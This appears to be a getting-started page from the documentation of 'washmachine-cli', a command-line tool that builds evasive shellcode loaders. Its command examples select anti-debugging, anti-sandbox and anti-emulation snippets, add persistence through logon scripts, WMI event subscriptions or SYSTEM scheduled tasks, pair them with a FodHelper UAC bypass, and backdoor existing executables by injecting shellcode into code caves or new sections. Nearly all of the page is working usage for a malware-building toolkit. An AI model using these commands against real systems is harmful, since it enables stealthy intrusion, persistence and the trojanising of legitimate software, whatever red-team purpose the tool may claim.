# First Compilation

Walk through your first shellcode loader build with the CLI.

## Preflight first

Before your first build, confirm every external tool is ready:

```powershell
washmachine-cli doctor
```

You want four `OK` rows. If anything is missing, [troubleshooting](/guide/troubleshooting) tells you exactly how to fix each row.

## Encode a loader

```powershell
# Minimal loader from a shellcode file
washmachine-cli encode -s payload.bin

# Full-featured loader with the default template
washmachine-cli encode -s payload.bin -t default

# Stealth loader with encoding and envelope
washmachine-cli encode -s payload.bin -t stealth -e 1 -v 2

# Compile from inline hex
washmachine-cli encode --shellcode-hex FC4883E4F0...

# JSON output for CI/CD pipelines
washmachine-cli encode -s payload.bin --json
```

## Selecting snippets

Each template has placeholders for snippet sections (anti-debugging, evasion, injection, persistence, etc.). Override the default selection for any section with `--snippet`:

```powershell
# Use a specific anti-emulation technique
washmachine-cli encode -s payload.bin --snippet antiemulation=SirAllocALot

# Combine multiple snippet overrides
washmachine-cli encode -s payload.bin -t default \
  --snippet antisandbox=Default \
  --snippet antidebugging=IsDebuggerPresent \
  --snippet shellcodeexecution=VirtualAlloc

# Add user-level persistence (no admin required)
washmachine-cli encode -s payload.bin -t default \
  --snippet persistence=LogonScript

# Add admin persistence — must also select a UAC bypass
washmachine-cli encode -s payload.bin -t default \
  --snippet uacb=FodHelper \
  --snippet persistence=WmiEventSubscription

# Boot-time SYSTEM execution via scheduled task
washmachine-cli encode -s payload.bin -t default \
  --snippet uacb=FodHelper \
  --snippet persistence=SchtasksSystem
```

Run `washmachine-cli show modules` to see all available sections and item IDs.

## Analyze a PE file

```powershell
# Full analysis dashboard
washmachine-cli analyze target.exe

# JSON output for downstream processing
washmachine-cli analyze target.exe --json
```

::: tip Deep dive
For a detailed look at how PE analysis works under the hood, see [PE Analysis Internals](/internals/pe-analysis).
:::

## Extract shellcode from a PE

```powershell
# Default: entry point to end of .text section
washmachine-cli strip loader.exe

# Extract a named section
washmachine-cli strip loader.exe -m section --section .text -o payload.bin

# Analyze extraction targets without extracting
washmachine-cli strip loader.exe --analyze
```

## Inject shellcode into a PE

```powershell
# Code-cave injection (default method)
washmachine-cli backdoor --pe target.exe -s payload.bin

# New section method with custom output path
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe

# Dry run — analyze feasibility without modifying
washmachine-cli backdoor --pe target.exe -s payload.bin --dry-run
```
